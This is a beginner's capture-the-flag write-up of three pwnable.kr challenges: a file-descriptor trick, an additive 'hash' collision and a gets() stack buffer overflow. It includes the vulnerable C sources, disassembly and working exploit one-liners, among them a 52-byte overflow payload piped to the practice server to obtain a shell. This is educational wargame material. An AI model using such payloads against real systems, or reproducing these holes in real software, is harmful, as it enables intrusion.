---
title: "pwnable.kr: fd, collision & buffer overflow"
date: "2026-06-01"
tags: ["writeup", "pwn", "pwnable"]
pinned: false
draft: false
excerpt: "The first of three beginner pwnable.kr writeups — fd, and how a Linux file descriptor trick lets you write straight into the compared buffer."
---

hello, today i tried out [pwnable](https://pwnable.kr/play.php) and i started out with three basic challenges for the day, this is my writeup for them.

## [FD]
Mommy! what is a file descriptor in Linux?

```bash
fd@ubuntu:~$ ls
fd  fd.c  flag
```

these were my files for this challenge, quite simple really.
fd.c:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
char buf[32];
int main(int argc, char* argv[], char* envp[]){
	if(argc<2){
		printf("pass argv[1] a number\n");
		return 0;
	}
	int fd = atoi( argv[1] ) - 0x1234;
	int len = 0;
	len = read(fd, buf, 32);
	if(!strcmp("LETMEWIN\n", buf)){
		printf("good job :)\n");
		setregid(getegid(), getegid());
		system("/bin/cat flag");
		exit(0);
	}
	printf("learn about Linux file IO\n");
	return 0;

}
```

at first i tried:

```bash
fd@ubuntu:~$ ./fd LETMEWIN
learn about Linux file IO
```

then i looked up at the linux file IO and after a little bit of reading about file descriptors, i understood that the function "read()" is vulnerable
basically, when read(fd, buf, 32) gets fd==0 (for example here when you set it to 4660) it let's you write whatever you want to the buffer

```c
int fd = atoi( argv[1] ) - 0x1234;
```

when fd ==0x1234, fd==0
which then, i need to input LETMEWIN because that's the string we can see being compared to buf

```c
f(!strcmp("LETMEWIN\n", buf)
```

then, all i have to do is input 4660 to make fd==0 and write the key :)

```bash
fd@ubuntu:~$ ./fd 4660 
LETMEWIN
good job :)
<<pwnable AUTH flag>>
```

## [collision]
Daddy told me about cool MD5 hash collision today.
I wanna do something like that too!


same thing this time, different vulnerability
```bash
col@ubuntu:~$ ls
col  col.c  flag 

col@ubuntu:~$ cat col.c
```
```c
#include <stdio.h>
#include <string.h>
unsigned long hashcode = 0x21DD09EC;
unsigned long check_password(const char* p){
	int* ip = (int*)p;
	int i;
	int res=0;
	for(i=0; i<5; i++){
		res += ip[i];
	}
	return res;
}

int main(int argc, char* argv[]){
	if(argc<2){
		printf("usage : %s [passcode]\n", argv[0]);
		return 0;
	}
	if(strlen(argv[1]) != 20){
		printf("passcode length should be 20 bytes\n");
		return 0;
	}

	if(hashcode == check_password( argv[1] )){
		setregid(getegid(), getegid());
		system("/bin/cat flag");
		return 0;
	}
	else
		printf("wrong passcode.\n");
	return 0;
}
```
this one had me really confused, my first guess was that `hashcode = 0x21DD09EC` is an MD5 hash that has some sort of hash collision that i was supposed to find on the internet somehow, which, of course, was not the solution. and after going at it for a while, i decided to actually read the code
after looking at it really hard, i think the name and comment are a little misleading, this has nothing to really do with any real hash function 

`check_password` requires me to find a 20 byte password, that when it enters the function turns into five 32 bit integers and adds them together. 

so the puzzle is reduced to: find 5 ints whose sum is `0x21DD09EC` 
convert to dec:
`0x21DD09EC = 568134124`
`568134124 / 5 = 113626824 remainder 4`
so four ints of `113626824 (0x06C5CEC8)` and one `0x06C5CEC8 + 4 = 0x06C5CECC`

then, i have to convert to Raw little-endian and pass it using python2:

```bash
./col $(python2 -c 'print "\xc8\xce\xc5\x06"*4 + "\xcc\xce\xc5\x06"')
```
that got me the auth flag !

## [bof]
Nana told me that buffer overflow is one of the most common software vulnerability. 
Is that true?

```bash
bof@ubuntu:~$ ls
bof  bof.c  readme
bof@ubuntu:~$ cat readme 
bof binary is running at "nc 0 9000" under bof_pwn privilege. get shell and read flag
bof@ubuntu:~$ nc 0 9000

overflow me : Nah..

bof@ubuntu:~$ cat bof.c
```
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		setregid(getegid(), getegid());
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}
```

this challenge was obviously about buffer overflow, and one of the oldest ones! i have heard about this one before so when i saw the function "gets" i knew what i needed to do
```c
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}
```
in `main` we can see that the function is called with a fixed number, `0xdeadbeef`

### the gets function
```bash
char overflowme[32];   // a box that holds 32 characters
gets(overflowme);      // read typed input into that box
```
`char overflowme[32]` is a buffer, and gets never checks if it's out of room to allow the buffer. so what we can do is write way past after the gets function 

basically, my goal is to change `key` to `0xcafebabe`, in this line: `if(key == 0xcafebabe)` so that when the program runs key is equal to `0xcafebabe` and the boolean is True, which will give me the shell i need

first, i'll use `objdump` on the bof file and grep the function to see where the gets function starts and when the key variable starts
```bash
 objdump -d bof | grep -A40 '<func>:'
000011fd <func>:
    11fd:	55                   	push   %ebp
    11fe:	89 e5                	mov    %esp,%ebp
    1200:	56                   	push   %esi
    1201:	53                   	push   %ebx
    1202:	83 ec 30             	sub    $0x30,%esp
    1205:	e8 f6 fe ff ff       	call   1100 <__x86.get_pc_thunk.bx>
    120a:	81 c3 f6 2d 00 00    	add    $0x2df6,%ebx
    1210:	65 a1 14 00 00 00    	mov    %gs:0x14,%eax
    1216:	89 45 f4             	mov    %eax,-0xc(%ebp)
    1219:	31 c0                	xor    %eax,%eax
    121b:	83 ec 0c             	sub    $0xc,%esp
    121e:	8d 83 08 e0 ff ff    	lea    -0x1ff8(%ebx),%eax
    1224:	50                   	push   %eax
    1225:	e8 26 fe ff ff       	call   1050 <printf@plt>
    122a:	83 c4 10             	add    $0x10,%esp
    122d:	83 ec 0c             	sub    $0xc,%esp
    1230:	8d 45 d4             	lea    -0x2c(%ebp),%eax
    1233:	50                   	push   %eax
    1234:	e8 27 fe ff ff       	call   1060 <gets@plt>
    1239:	83 c4 10             	add    $0x10,%esp
    123c:	81 7d 08 be ba fe ca 	cmpl   $0xcafebabe,0x8(%ebp)
    1243:	75 2d                	jne    1272 <func+0x75>
    1245:	e8 36 fe ff ff       	call   1080 <getegid@plt>
    124a:	89 c6                	mov    %eax,%esi
    124c:	e8 2f fe ff ff       	call   1080 <getegid@plt>
    1251:	83 ec 08             	sub    $0x8,%esp
    1254:	56                   	push   %esi
    1255:	50                   	push   %eax
    1256:	e8 55 fe ff ff       	call   10b0 <setregid@plt>
    125b:	83 c4 10             	add    $0x10,%esp
    125e:	83 ec 0c             	sub    $0xc,%esp
    1261:	8d 83 17 e0 ff ff    	lea    -0x1fe9(%ebx),%eax
    1267:	50                   	push   %eax
    1268:	e8 33 fe ff ff       	call   10a0 <system@plt>
    126d:	83 c4 10             	add    $0x10,%esp
    1270:	eb 12                	jmp    1284 <func+0x87>
    1272:	83 ec 0c             	sub    $0xc,%esp
    1275:	8d 83 1f e0 ff ff    	lea    -0x1fe1(%ebx),%eax
    127b:	50                   	push   %eax
    127c:	e8 0f fe ff ff       	call   1090 <puts@plt>
```
we can see that the gets function starts at 
`ebp - 0x2c = 44 below ebp `
```bash
    1230:	8d 45 d4             	lea    -0x2c(%ebp),%eax
    1233:	50                   	push   %eax
    1234:	e8 27 fe ff ff       	call   1060 <gets@plt>
```
then, we can see that the value of `0xcafebabe` starts at 8 above ebp 
```bash
123c:	81 7d 08 be ba fe ca 	cmpl   $0xcafebabe,0x8(%ebp)
```
 which means there's a 52 byte gap between them. so i need to make a payload that writes random junk into that 52 byte offset and then changes `key` to `0xcafebabe` 

 this is what i came up with:
 `(python3 -c 'print("A"*52 + "\xbe\xba\xfe\xca")'; cat) | nc pwnable.kr 9000`
b"A"*52 covers everything for those 52 bytes with A and +  \xbe\xba\xfe\xca writes the key, but it didn't work for some reason.

so this is what i ended up actually using:
`(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*52+b"\xbe\xba\xfe\xca")'; cat) | nc pwnable.kr 9000`

this is because of python3 syntax, i've heard from someone that my first command would have worked if i had used python2, but i can't confirm or deny that.
after that i got a shell and read the flag!
